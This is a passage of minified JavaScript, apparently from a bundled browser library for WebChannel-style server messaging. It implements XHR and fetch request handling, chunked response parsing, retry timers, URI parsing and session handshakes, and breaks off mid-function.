Lt(){}Lt.prototype.h=null;function vc(c){return c.h||(c.h=c.i())}function Vt(){}var _t={OPEN:"a",kb:"b",Ja:"c",wb:"d"};function Ca(){V.call(this,"d")}x(Ca,V);function Dt(){V.call(this,"c")}x(Dt,V);var pt={},_c=null;function At(){return _c=_c||new P}pt.La="serverreachability";function Ft(c){V.call(this,pt.La,c)}x(Ft,V);function Is(c){const g=At();m(g,new Ft(g))}pt.STAT_EVENT="statevent";function zt(c,g){V.call(this,pt.STAT_EVENT,c),this.stat=g}x(zt,V);function Ge(c){const g=At();m(g,new zt(g,c))}pt.Ma="timingevent";function Ec(c,g){V.call(this,pt.Ma,c),this.size=g}x(Ec,V);function Et(c,g){if(typeof c!="function")throw Error("Fn must not be null and must be a function");return a.setTimeout(function(){c()},g)}function It(){this.g=!0}It.prototype.xa=function(){this.g=!1};function xh(c,g,T,U,Z,ne){c.info(function(){if(c.g)if(ne)for(var fe="",wt=ne.split("&"),Cn=0;Cn<wt.length;Cn++){var et=wt[Cn].split("=");if(1<et.length){var zn=et[0];et=et[1];var Wn=zn.split("_");fe=2<=Wn.length&&Wn[1]=="type"?fe+(zn+"="+et+"&"):fe+(zn+"=redacted&")}}else fe=null;else fe=ne;return"XMLHTTP REQ ("+U+") [attempt "+Z+"]: "+g+`
`+T+`
`+fe})}function Yt(c,g,T,U,Z,ne,fe){c.info(function(){return"XMLHTTP RESP ("+U+") [ attempt "+Z+"]: "+g+`
`+T+`
`+ne+" "+fe})}function yt(c,g,T,U){c.info(function(){return"XMLHTTP TEXT ("+g+"): "+Zt(c,T)+(U?" "+U:"")})}function kh(c,g){c.info(function(){return"TIMEOUT: "+g})}It.prototype.info=function(){};function Zt(c,g){if(!c.g)return g;if(!g)return null;try{var T=JSON.parse(g);if(T){for(c=0;c<T.length;c++)if(Array.isArray(T[c])){var U=T[c];if(!(2>U.length)){var Z=U[1];if(Array.isArray(Z)&&!(1>Z.length)){var ne=Z[0];if(ne!="noop"&&ne!="stop"&&ne!="close")for(var fe=1;fe<Z.length;fe++)Z[fe]=""}}}}return Re(T)}catch{return g}}var bt={NO_ERROR:0,gb:1,tb:2,sb:3,nb:4,rb:5,ub:6,Ia:7,TIMEOUT:8,xb:9},Ic={lb:"complete",Hb:"success",Ja:"error",Ia:"abort",zb:"ready",Ab:"readystatechange",TIMEOUT:"timeout",vb:"incrementaldata",yb:"progress",ob:"downloadprogress",Pb:"uploadprogress"},Ot;function xt(){}x(xt,Lt),xt.prototype.g=function(){return new XMLHttpRequest},xt.prototype.i=function(){return{}},Ot=new xt;function Br(c,g,T,U){this.j=c,this.i=g,this.l=T,this.R=U||1,this.U=new te(this),this.I=45e3,this.H=null,this.o=!1,this.m=this.A=this.v=this.L=this.F=this.S=this.B=null,this.D=[],this.g=null,this.C=0,this.s=this.u=null,this.X=-1,this.J=!1,this.O=0,this.M=null,this.W=this.K=this.T=this.P=!1,this.h=new Ra}function Ra(){this.i=null,this.g="",this.h=!1}var Ma={},Co={};function Ro(c,g,T){c.L=1,c.v=Mh(zi(g)),c.m=T,c.P=!0,Na(c,null)}function Na(c,g){c.F=Date.now(),Ss(c),c.A=zi(c.v);var T=c.A,U=c.R;Array.isArray(U)||(U=[String(U)]),S1(T.i,"t",U),c.C=0,T=c.j.J,c.h=new Ra,c.g=F1(c.j,T?g:null,!c.m),0<c.O&&(c.M=new J(p(c.Y,c,c.g),c.O)),g=c.U,T=c.g,U=c.ca;var Z="readystatechange";Array.isArray(Z)||(Z&&(Oe[0]=Z.toString()),Z=Oe);for(var ne=0;ne<Z.length;ne++){var fe=ji(T,Z[ne],U||g.handleEvent,!1,g.h||g);if(!fe)break;g.g[fe.key]=fe}g=c.H?N(c.H):{},c.m?(c.u||(c.u="POST"),g["Content-Type"]="application/x-www-form-urlencoded",c.g.ea(c.A,c.u,c.m,g)):(c.u="GET",c.g.ea(c.A,c.u,null,g)),Is(),xh(c.i,c.u,c.A,c.l,c.R,c.m)}Br.prototype.ca=function(c){c=c.target;const g=this.M;g&&Wi(c)==3?g.j():this.Y(c)},Br.prototype.Y=function(c){try{if(c==this.g)e:{const Wn=Wi(this.g);var g=this.g.Ba();const Va=this.g.Z();if(!(3>Wn)&&(Wn!=3||this.g&&(this.h.h||this.g.oa()||R1(this.g)))){this.J||Wn!=4||g==7||(g==8||0>=Va?Is(3):Is(2)),Mo(this);var T=this.g.Z();this.X=T;t:if(Pa(this)){var U=R1(this.g);c="";var Z=U.length,ne=Wi(this.g)==4;if(!this.h.i){if(typeof TextDecoder>"u"){Zr(this),Fi(this);var fe="";break t}this.h.i=new a.TextDecoder}for(g=0;g<Z;g++)this.h.h=!0,c+=this.h.i.decode(U[g],{stream:!(ne&&g==Z-1)});U.length=0,this.h.g+=c,this.C=0,fe=this.h.g}else fe=this.g.oa();if(this.o=T==200,Yt(this.i,this.u,this.A,this.l,this.R,Wn,T),this.o){if(this.T&&!this.K){t:{if(this.g){var wt,Cn=this.g;if((wt=Cn.g?Cn.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!b(wt)){var et=wt;break t}}et=null}if(T=et)yt(this.i,this.l,T,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,No(this,T);else{this.o=!1,this.s=3,Ge(12),Zr(this),Fi(this);break e}}if(this.P){T=!0;let Jr;for(;!this.J&&this.C<fe.length;)if(Jr=Sc(this,fe),Jr==Co){Wn==4&&(this.s=4,Ge(14),T=!1),yt(this.i,this.l,null,"[Incomplete Response]");break}else if(Jr==Ma){this.s=4,Ge(15),yt(this.i,this.l,fe,"[Invalid Chunk]"),T=!1;break}else yt(this.i,this.l,Jr,null),No(this,Jr);if(Pa(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),Wn!=4||fe.length!=0||this.h.h||(this.s=1,Ge(16),T=!1),this.o=this.o&&T,!T)yt(this.i,this.l,fe,"[Invalid Chunked Response]"),Zr(this),Fi(this);else if(0<fe.length&&!this.W){this.W=!0;var zn=this.j;zn.g==this&&zn.ba&&!zn.M&&(zn.j.info("Great, no buffering proxy detected. Bytes received: "+fe.length),yg(zn),zn.M=!0,Ge(11))}}else yt(this.i,this.l,fe,null),No(this,fe);Wn==4&&Zr(this),this.o&&!this.J&&(Wn==4?B1(this.j,this):(this.o=!1,Ss(this)))}else rR(this.g),T==400&&0<fe.indexOf("Unknown SID")?(this.s=3,Ge(12)):(this.s=0,Ge(13)),Zr(this),Fi(this)}}}catch{}finally{}};function Pa(c){return c.g?c.u=="GET"&&c.L!=2&&c.j.Ca:!1}function Sc(c,g){var T=c.C,U=g.indexOf(`
`,T);return U==-1?Co:(T=Number(g.substring(T,U)),isNaN(T)?Ma:(U+=1,U+T>g.length?Co:(g=g.slice(U,U+T),c.C=U+T,g)))}Br.prototype.cancel=function(){this.J=!0,Zr(this)};function Ss(c){c.S=Date.now()+c.I,La(c,c.I)}function La(c,g){if(c.B!=null)throw Error("WatchDog timer not null");c.B=Et(p(c.ba,c),g)}function Mo(c){c.B&&(a.clearTimeout(c.B),c.B=null)}Br.prototype.ba=function(){this.B=null;const c=Date.now();0<=c-this.S?(kh(this.i,this.A),this.L!=2&&(Is(),Ge(17)),Zr(this),this.s=2,Fi(this)):La(this,this.S-c)};function Fi(c){c.j.G==0||c.J||B1(c.j,c)}function Zr(c){Mo(c);var g=c.M;g&&typeof g.ma=="function"&&g.ma(),c.M=null,Le(c.U),c.g&&(g=c.g,c.g=null,g.abort(),g.ma())}function No(c,g){try{var T=c.j;if(T.G!=0&&(T.g==c||Po(T.h,c))){if(!c.K&&Po(T.h,c)&&T.G==3){try{var U=T.Da.g.parse(g)}catch{U=null}if(Array.isArray(U)&&U.length==3){var Z=U;if(Z[0]==0){e:if(!T.u){if(T.g)if(T.g.F+3e3<c.F)Bh(T),Dh(T);else break e;mg(T),Ge(18)}}else T.za=Z[1],0<T.za-T.T&&37500>Z[2]&&T.F&&T.v==0&&!T.C&&(T.C=Et(p(T.Za,T),6e3));if(1>=Ba(T.h)&&T.ca){try{T.ca()}catch{}T.ca=void 0}}else Do(T,11)}else if((c.K||T.g==c)&&Bh(T),!b(g))for(Z=T.Da.g.parse(g),g=0;g<Z.length;g++){let et=Z[g];if(T.T=et[0],et=et[1],T.G==2)if(et[0]=="c"){T.K=et[1],T.ia=et[2];const zn=et[3];zn!=null&&(T.la=zn,T.j.info("VER="+T.la));const Wn=et[4];Wn!=null&&(T.Aa=Wn,T.j.info("SVER="+T.Aa));const Va=et[5];Va!=null&&typeof Va=="number"&&0<Va&&(U=1.5*Va,T.L=U,T.j.info("backChannelRequestTimeoutMs_="+U)),U=T;const Jr=c.g;if(Jr){const jh=Jr.g?Jr.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(jh){var ne=U.h;ne.g||jh.indexOf("spdy")==-1&&jh.indexOf("quic")==-1&&jh.indexOf("h2")==-1||(ne.j=ne.l,ne.g=new Set,ne.h&&(dg(ne,ne.h),ne.h=null))}if(U.D){const wg=Jr.g?Jr.g.getResponseHeader("X-HTTP-Session-Id"):null;wg&&(U.ya=wg,kt(U.I,U.D,wg))}}T.G=3,T.l&&T.l.ua(),T.ba&&(T.R=Date.now()-c.F,T.j.info("Handshake RTT: "+T.R+"ms")),U=T;var fe=c;if(U.qa=V1(U,U.J?U.ia:null,U.W),fe.K){g1(U.h,fe);var wt=fe,Cn=U.L;Cn&&(wt.I=Cn),wt.B&&(Mo(wt),Ss(wt)),U.g=fe}else D1(U);0<T.i.length&&Oh(T)}else et[0]!="stop"&&et[0]!="close"||Do(T,7);else T.G==3&&(et[0]=="stop"||et[0]=="close"?et[0]=="stop"?Do(T,7):gg(T):et[0]!="noop"&&T.l&&T.l.ta(et),T.v=0)}}Is(4)}catch{}}var Tc=class{constructor(c,g){this.g=c,this.map=g}};function Da(c){this.l=c||10,a.PerformanceNavigationTiming?(c=a.performance.getEntriesByType("navigation"),c=0<c.length&&(c[0].nextHopProtocol=="hq"||c[0].nextHopProtocol=="h2")):c=!!(a.chrome&&a.chrome.loadTimes&&a.chrome.loadTimes()&&a.chrome.loadTimes().wasFetchedViaSpdy),this.j=c?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}function Oa(c){return c.h?!0:c.g?c.g.size>=c.j:!1}function Ba(c){return c.h?1:c.g?c.g.size:0}function Po(c,g){return c.h?c.h==g:c.g?c.g.has(g):!1}function dg(c,g){c.g?c.g.add(g):c.h=g}function g1(c,g){c.h&&c.h==g?c.h=null:c.g&&c.g.has(g)&&c.g.delete(g)}Da.prototype.cancel=function(){if(this.i=m1(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const c of this.g.values())c.cancel();this.g.clear()}};function m1(c){if(c.h!=null)return c.i.concat(c.h.D);if(c.g!=null&&c.g.size!==0){let g=c.i;for(const T of c.g.values())g=g.concat(T.D);return g}return k(c.i)}function zC(c){if(c.V&&typeof c.V=="function")return c.V();if(typeof Map<"u"&&c instanceof Map||typeof Set<"u"&&c instanceof Set)return Array.from(c.values());if(typeof c=="string")return c.split("");if(l(c)){for(var g=[],T=c.length,U=0;U<T;U++)g.push(c[U]);return g}g=[],T=0;for(U in c)g[T++]=c[U];return g}function WC(c){if(c.na&&typeof c.na=="function")return c.na();if(!c.V||typeof c.V!="function"){if(typeof Map<"u"&&c instanceof Map)return Array.from(c.keys());if(!(typeof Set<"u"&&c instanceof Set)){if(l(c)||typeof c=="string"){var g=[];c=c.length;for(var T=0;T<c;T++)g.push(T);return g}g=[],T=0;for(const U in c)g[T++]=U;return g}}}function y1(c,g){if(c.forEach&&typeof c.forEach=="function")c.forEach(g,void 0);else if(l(c)||typeof c=="string")Array.prototype.forEach.call(c,g,void 0);else for(var T=WC(c),U=zC(c),Z=U.length,ne=0;ne<Z;ne++)g.call(void 0,U[ne],T&&T[ne],c)}var w1=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function $C(c,g){if(c){c=c.split("&");for(var T=0;T<c.length;T++){var U=c[T].indexOf("="),Z=null;if(0<=U){var ne=c[T].substring(0,U);Z=c[T].substring(U+1)}else ne=c[T];g(ne,Z?decodeURIComponent(Z.replace(/\+/g," ")):"")}}}function Lo(c){if(this.g=this.o=this.j="",this.s=null,this.m=this.l="",this.h=!1,c instanceof Lo){this.h=c.h,Ch(this,c.j),this.o=c.o,this.g=c.g,Rh(this,c.s),this.l=c.l;var g=c.i,T=new xc;T.i=g.i,g.g&&(T.g=new Map(g.g),T.h=g.h),v1(this,T),this.m=c.m}else c&&(g=String(c).match(w1))?(this.h=!1,Ch(this,g[1]||"",!0),this.o=Ac(g[2]||""),this.g=Ac(g[3]||"",!0),Rh(this,g[4]),this.l=Ac(g[5]||"",!0),v1(this,g[6]||"",!0),this.m=Ac(g[7]||"")):(this.h=!1,this.i=new xc(null,this.h))}Lo.prototype.toString=function(){var c=[],g=this.j;g&&c.push(bc(g,_1,!0),":");var T=this.g;return(T||g=="file")&&(c.push("//"),(g=this.o)&&c.push(bc(g,_1,!0),"@"),c.push(encodeURIComponent(String(T)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),T=this.s,T!=null&&c.push(":",String(T))),(T=this.l)&&(this.g&&T.charAt(0)!="/"&&c.push("/"),c.push(bc(T,T.charAt(0)=="/"?KC:qC,!0))),(T=this.i.toString())&&c.push("?",T),(T=this.m)&&c.push("#",bc(T,QC)),c.join("")};function zi(c){return new Lo(c)}function Ch(c,g,T){c.j=T?Ac(g,!0):g,c.j&&(c.j=c.j.replace(/:$/,""))}function Rh(c,g){if(g){if(g=Number(g),isNaN(g)||0>g)throw Error("Bad port number "+g);c.s=g}else c.s=null}function v1(c,g,T){g instanceof xc?(c.i=g,YC(c.i,c.h)):(T||(g=bc(g,GC)),c.i=new xc(g,c.h))}function kt(c,g,T){c.i.set(g,T)}function Mh(c){return kt(c,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),c}function Ac(c,g){return c?g?decodeURI(c.replace(/%25/g,"%2525")):decodeURIComponent(c):""}function bc(c,g,T){return typeof c=="string"?(c=encodeURI(c).replace(g,HC),T&&(c=c.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),c):null}function HC(c){return c=c.charCodeAt(0),"%"+(c>>4&15).toString(16)+(c&15).toString(16)}var _1=/[#\/\?@]/g,qC=/[#\?:]/g,KC=/[#\?]/g,GC=/[#\?@]/g,QC=/#/g;function xc(c,g){this.h=this.g=null,this.i=c||null,this.j=!!g}function Ts(c){c.g||(c.g=new Map,c.h=0,c.i&&$C(c.i,function(g,T){c.add(decodeURIComponent(g.replace(/\+/g," ")),T)}))}n=xc.prototype,n.add=function(c,g){Ts(this),this.i=null,c=Ua(this,c);var T=this.g.get(c);return T||this.g.set(c,T=[]),T.push(g),this.h+=1,this};function E1(c,g){Ts(c),g=Ua(c,g),c.g.has(g)&&(c.i=null,c.h-=c.g.get(g).length,c.g.delete(g))}function I1(c,g){return Ts(c),g=Ua(c,g),c.g.has(g)}n.forEach=function(c,g){Ts(this),this.g.forEach(function(T,U){T.forEach(function(Z){c.call(g,Z,U,this)},this)},this)},n.na=function(){Ts(this);const c=Array.from(this.g.values()),g=Array.from(this.g.keys()),T=[];for(let U=0;U<g.length;U++){const Z=c[U];for(let ne=0;ne<Z.length;ne++)T.push(g[U])}return T},n.V=function(c){Ts(this);let g=[];if(typeof c=="string")I1(this,c)&&(g=g.concat(this.g.get(Ua(this,c))));else{c=Array.from(this.g.values());for(let T=0;T<c.length;T++)g=g.concat(c[T])}return g},n.set=function(c,g){return Ts(this),this.i=null,c=Ua(this,c),I1(this,c)&&(this.h-=this.g.get(c).length),this.g.set(c,[g]),this.h+=1,this},n.get=function(c,g){return c?(c=this.V(c),0<c.length?String(c[0]):g):g};function S1(c,g,T){E1(c,g),0<T.length&&(c.i=null,c.g.set(Ua(c,g),k(T)),c.h+=T.length)}n.toString=function(){if(this.i)return this.i;if(!this.g)return"";const c=[],g=Array.from(this.g.keys());for(var T=0;T<g.length;T++){var U=g[T];const ne=encodeURIComponent(String(U)),fe=this.V(U);for(U=0;U<fe.length;U++){var Z=ne;fe[U]!==""&&(Z+="="+encodeURIComponent(String(fe[U]))),c.push(Z)}}return this.i=c.join("&")};function Ua(c,g){return g=String(g),c.j&&(g=g.toLowerCase()),g}function YC(c,g){g&&!c.j&&(Ts(c),c.i=null,c.g.forEach(function(T,U){var Z=U.toLowerCase();U!=Z&&(E1(this,U),S1(this,Z,T))},c)),c.j=g}function ZC(c,g){const T=new It;if(a.Image){const U=new Image;U.onload=w(As,T,"TestLoadImage: loaded",!0,g,U),U.onerror=w(As,T,"TestLoadImage: error",!1,g,U),U.onabort=w(As,T,"TestLoadImage: abort",!1,g,U),U.ontimeout=w(As,T,"TestLoadImage: timeout",!1,g,U),a.setTimeout(function(){U.ontimeout&&U.ontimeout()},1e4),U.src=c}else g(!1)}function JC(c,g){const T=new It,U=new AbortController,Z=setTimeout(()=>{U.abort(),As(T,"TestPingServer: timeout",!1,g)},1e4);fetch(c,{signal:U.signal}).then(ne=>{clearTimeout(Z),ne.ok?As(T,"TestPingServer: ok",!0,g):As(T,"TestPingServer: server error",!1,g)}).catch(()=>{clearTimeout(Z),As(T,"TestPingServer: error",!1,g)})}function As(c,g,T,U,Z){try{Z&&(Z.onload=null,Z.onerror=null,Z.onabort=null,Z.ontimeout=null),U(T)}catch{}}function XC(){this.g=new ke}function eR(c,g,T){const U=T||"";try{y1(c,function(Z,ne){let fe=Z;u(Z)&&(fe=Re(Z)),g.push(U+ne+"="+encodeURIComponent(fe))})}catch(Z){throw g.push(U+"type="+encodeURIComponent("_badmap")),Z}}function Nh(c){this.l=c.Ub||null,this.j=c.eb||!1}x(Nh,Lt),Nh.prototype.g=function(){return new Ph(this.l,this.j)},Nh.prototype.i=function(c){return function(){return c}}({});function Ph(c,g){P.call(this),this.D=c,this.o=g,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.u=new Headers,this.h=null,this.B="GET",this.A="",this.g=!1,this.v=this.j=this.l=null}x(Ph,P),n=Ph.prototype,n.open=function(c,g){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.B=c,this.A=g,this.readyState=1,Cc(this)},n.send=function(c){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");this.g=!0;const g={headers:this.u,method:this.B,credentials:this.m,cache:void 0};c&&(g.body=c),(this.D||a).fetch(new Request(this.A,g)).then(this.Sa.bind(this),this.ga.bind(this))},n.abort=function(){this.response=this.responseText="",this.u=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),1<=this.readyState&&this.g&&this.readyState!=4&&(this.g=!1,kc(this)),this.readyState=0},n.Sa=function(c){if(this.g&&(this.l=c,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=c.headers,this.readyState=2,Cc(this)),this.g&&(this.readyState=3,Cc(this),this.g)))if(this.responseType==="arraybuffer")c.arrayBuffer().then(this.Qa.bind(this),this.ga.bind(this));else if(typeof a.ReadableStream<"u"&&"body"in c){if(this.j=c.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.v=new TextDecoder;T1(this)}else c.text().then(this.Ra.bind(this),this.ga.bind(this))};function T1(c){c.j.read().then(c.Pa.bind(c)).catch(c.ga.bind(c))}n.Pa=function(c){if(this.g){if(this.o&&c.value)this.response.push(c.value);else if(!this.o){var g=c.value?c.value:new Uint8Array(0);(g=this.v.decode(g,{stream:!c.done}))&&(this.response=this.responseText+=g)}c.done?kc(this):Cc(this),this.readyState==3&&T1(this)}},n.Ra=function(c){this.g&&(this.response=this.responseText=c,kc(this))},n.Qa=function(c){this.g&&(this.response=c,kc(this))},n.ga=function(){this.g&&kc(this)};function kc(c){c.readyState=4,c.l=null,c.j=null,c.v=null,Cc(c)}n.setRequestHeader=function(c,g){this.u.append(c,g)},n.getResponseHeader=function(c){return this.h&&this.h.get(c.toLowerCase())||""},n.getAllResponseHeaders=function(){if(!this.h)return"";const c=[],g=this.h.entries();for(var T=g.next();!T.done;)T=T.value,c.push(T[0]+": "+T[1]),T=g.next();return c.join(`\r
`)};function Cc(c){c.onreadystatechange&&c.onreadystatechange.call(c)}Object.defineProperty(Ph.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(c){this.m=c?"include":"same-origin"}});function A1(c){let g="";return q(c,function(T,U){g+=U,g+=":",g+=T,g+=`\r
`}),g}function pg(c,g,T){e:{for(U in T){var U=!1;break e}U=!0}U||(T=A1(T),typeof c=="string"?T!=null&&encodeURIComponent(String(T)):kt(c,g,T))}function Jt(c){P.call(this),this.headers=new Map,this.o=c||null,this.h=!1,this.v=this.g=null,this.D="",this.m=0,this.l="",this.j=this.B=this.u=this.A=!1,this.I=null,this.H="",this.J=!1}x(Jt,P);var tR=/^https?$/i,nR=["POST","PUT"];n=Jt.prototype,n.Ha=function(c){this.J=c},n.ea=function(c,g,T,U){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+c);g=g?g.toUpperCase():"GET",this.D=c,this.l="",this.m=0,this.A=!1,this.h=!0,this.g=this.o?this.o.g():Ot.g(),this.v=this.o?vc(this.o):vc(Ot),this.g.onreadystatechange=p(this.Ea,this);try{this.B=!0,this.g.open(g,String(c),!0),this.B=!1}catch(ne){b1(this,ne);return}if(c=T||"",T=new Map(this.headers),U)if(Object.getPrototypeOf(U)===Object.prototype)for(var Z in U)T.set(Z,U[Z]);else if(typeof U.keys=="function"&&typeof U.get=="function")for(const ne of U.keys())T.set(ne,U.get(ne));else throw Error("Unknown input type for opt_headers: "+String(U));U=Array.from(T.keys()).find(ne=>ne.toLowerCase()=="content-type"),Z=a.FormData&&c instanceof a.FormData,!(0<=Array.prototype.indexOf.call(nR,g,void 0))||U||Z||T.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[ne,fe]of T)this.g.setRequestHeader(ne,fe);this.H&&(this.g.responseType=this.H),"withCredentials"in this.g&&this.g.withCredentials!==this.J&&(this.g.withCredentials=this.J);try{C1(this),this.u=!0,this.g.send(c),this.u=!1}catch(ne){b1(this,ne)}};function b1(c,g){c.h=!1,c.g&&(c.j=!0,c.g.abort(),c.j=!1),c.l=g,c.m=5,x1(c),Lh(c)}function x1(c){c.A||(c.A=!0,m(c,"complete"),m(c,"error"))}n.abort=function(c){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.m=c||7,m(this,"complete"),m(this,"abort"),Lh(this))},n.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),Lh(this,!0)),Jt.aa.N.call(this)},n.Ea=function(){this.s||(this.B||this.u||this.j?k1(this):this.bb())},n.bb=function(){k1(this)};function k1(c){if(c.h&&typeof o<"u"&&(!c.v[1]||Wi(c)!=4||c.Z()!=2)){if(c.u&&Wi(c)==4)F(c.Ea,0,c);else if(m(c,"readystatechange"),Wi(c)==4){c.h=!1;try{const fe=c.Z();e:switch(fe){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var g=!0;break e;default:g=!1}var T;if(!(T=g)){var U;if(U=fe===0){var Z=String(c.D).match(w1)[1]||null;!Z&&a.self&&a.self.location&&(Z=a.self.location.protocol.slice(0,-1)),U=!tR.test(Z?Z.toLowerCase():"")}T=U}if(T)m(c,"complete"),m(c,"success");else{c.m=6;try{var ne=2<Wi(c)?c.g.statusText:""}catch{ne=""}c.l=ne+" ["+c.Z()+"]",x1(c)}}finally{Lh(c)}}}}function Lh(c,g){if(c.g){C1(c);const T=c.g,U=c.v[0]?()=>{}:null;c.g=null,c.v=null,g||m(c,"ready");try{T.onreadystatechange=U}catch{}}}function C1(c){c.I&&(a.clearTimeout(c.I),c.I=null)}n.isActive=function(){return!!this.g};function Wi(c){return c.g?c.g.readyState:0}n.Z=function(){try{return 2<Wi(this)?this.g.status:-1}catch{return-1}},n.oa=function(){try{return this.g?this.g.responseText:""}catch{return""}},n.Oa=function(c){if(this.g){var g=this.g.responseText;return c&&g.indexOf(c)==0&&(g=g.substring(c.length)),mt(g)}};function R1(c){try{if(!c.g)return null;if("response"in c.g)return c.g.response;switch(c.H){case"":case"text":return c.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in c.g)return c.g.mozResponseArrayBuffer}return null}catch{return null}}function rR(c){const g={};c=(c.g&&2<=Wi(c)&&c.g.getAllResponseHeaders()||"").split(`\r
`);for(let U=0;U<c.length;U++){if(b(c[U]))continue;var T=$(c[U]);const Z=T[0];if(T=T[1],typeof T!="string")continue;T=T.trim();const ne=g[Z]||[];g[Z]=ne,ne.push(T)}L(g,function(U){return U.join(", ")})}n.Ba=function(){return this.m},n.Ka=function(){return typeof this.l=="string"?this.l:String(this.l)};function Rc(c,g,T){return T&&T.internalChannelParams&&T.internalChannelParams[c]||g}function M1(c){this.Aa=0,this.i=[],this.j=new It,this.ia=this.qa=this.I=this.W=this.g=this.ya=this.D=this.H=this.m=this.S=this.o=null,this.Ya=this.U=0,this.Va=Rc("failFast",!1,c),this.F=this.C=this.u=this.s=this.l=null,this.X=!0,this.za=this.T=-1,this.Y=this.v=this.B=0,this.Ta=Rc("baseRetryDelayMs",5e3,c),this.cb=Rc("retryDelaySeedMs",1e4,c),this.Wa=Rc("forwardChannelMaxRetries",2,c),this.wa=Rc("forwardChannelRequestTimeoutMs",2e4,c),this.pa=c&&c.xmlHttpFactory||void 0,this.Xa=c&&c.Tb||void 0,this.Ca=c&&c.useFetchStreams||!1,this.L=void 0,this.J=c&&c.supportsCrossDomainXhr||!1,this.K="",this.h=new Da(c&&c.concurrentRequestLimit),this.Da=new XC,this.P=c&&c.fastHandshake||!1,this.O=c&&c.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.Ua=c&&c.Rb||!1,c&&c.xa&&this.j.xa(),c&&c.forceLongPolling&&(this.X=!1),this.ba=!this.P&&this.X&&c&&c.detectBufferingProxy||!1,this.ja=void 0,c&&c.longPollingTimeout&&0<c.longPollingTimeout&&(this.ja=c.longPollingTimeout),this.ca=void 0,this.R=0,this.M=!1,this.ka=this.A=null}n=M1.prototype,n.la=8,n.G=1,n.connect=function(c,g,T,U){Ge(0),this.W=c,this.H=g||{},T&&U!==void 0&&(this.H.OSID=T,this.H.OAID=U),this.F=this.X,this.I=V1(this,null,this.W),Oh(this)};function gg(c){if(N1(c),c.G==3){var g=c.U++,T=zi(c.I);if(kt(T,"SID",c.K),kt(T,"RID",g),kt(T,"TYPE","terminate"),Mc(c,T),g=new Br(c,c.j,g),g.L=2,g.v=Mh(zi(T)),T=!1,a.navigator&&a.navigator.sendBeacon)try{T=a.navigator.sendBeacon(g.v.toString(),"")}catch{}!T&&a.Image&&(new Image().src=g.v,T=!0),T||(g.g=F1(g.j,null),g.g.ea(g.v)),g.F=Date.now(),Ss(g)}j1(c)}function Dh(c){c.g&&(yg(c),c.g.cancel(),c.g=null)}function N1(c){Dh(c),c.u&&(a.clearTimeout(c.u),c.u=null),Bh(c),c.h.cancel(),c.s&&(typeof c.s=="number"&&a.clearTimeout(c.s),c.s=null)}function Oh(c){if(!Oa(c.h)&&!c.s){c.s=!0;var g=c.Ga;M||H(),R||(M(),R=!0),j.add(g,c),c.B=0}}function iR(c,g){return Ba(c.h)>=c.h.j-(c.s?1:0)?!1:c.s?(c.i=g.D.concat(c.i),!0):c.G==1||c.G==2||c.B>=(c.Va?0:c.Wa)?!1:(c.s=Et(p(c.Ga,c,g),U1(c,c.B)),c.B++,!0)}n.Ga=function(c){if(this.s)if(this.s=null,this.G==1){if(!c){this.U=Math.floor(1e5*Math.random()),c=this.U++;const Z=new Br(this,this.j,c);let ne=this.o;if(this.S&&(ne?(ne=N(ne),z(ne,this.S)):ne=this.S),this.m!==null||this.O||(Z.H=ne,ne=null),this.P)e:{for(var g=0,T=0;T<this.i.length;T++){t:{var U=this.i[T];if("__data__"in U.map&&(U=U.map.__data__,typeof U=="string")){U=U.length;break t}U=void 0}if(U===void 0)break;if(g+=U,4096<g){g=T;break e}if(g===4096||T===this.i.length-1){g=T+1;break e}}g=1e3}else g=1e3;g=L1(this,Z,g),T=zi(this.I),kt(T,"RID",c),kt(T,"CVER",22),this.D&&kt(T,"X-HTTP-Session-Id",this.D),Mc(this,T),ne&&(this.O?g="headers="+encodeURIComponent(String(A1(ne)))+"&"+g:this.m&&pg(T,this.m,ne)),dg(this.h,Z),this.Ua&&kt(T,"TYPE","init"),this.P?(kt(T,"$req",g),kt(T,"SID","null"),Z.T=!0,Ro(Z,T,null)):Ro(Z,T,g),this.G=2}}else this.G==3&&(c?P1(this,c):this.i.length==0||Oa(this.h)||P1(this))};function P1(c,g){var T;g?T=g.l:T=c.U++;const U=zi(c.I);kt(U,"SID",c.K),kt(U,"RID",T),kt(U,"AID",c.T),Mc(c,U),c.m&&c.o&&pg(U,c.m,c.o),T=new Br(c,c.j,T,c.B+1),c.m===null&&(T.H=c.o),g&&(c.i=g.D.concat(c.i)),g=L1(c,T,1e3),T.I=Math.round(.5*c.wa)+Math.round(.5*c.wa*Math.random()),dg(c.h,T),Ro(T,U,g)}function Mc(c,g){c.H&&q(c.H,function(T,U){kt(g,U,T)}),c.l&&y1({},function(T,U){kt(g,U,T)})}function L1(c,g,T){T=Math.min(c.i.length,T);var U=c.l?p(c.l.Na,c.l,c):null;e:{var Z=c.i;let 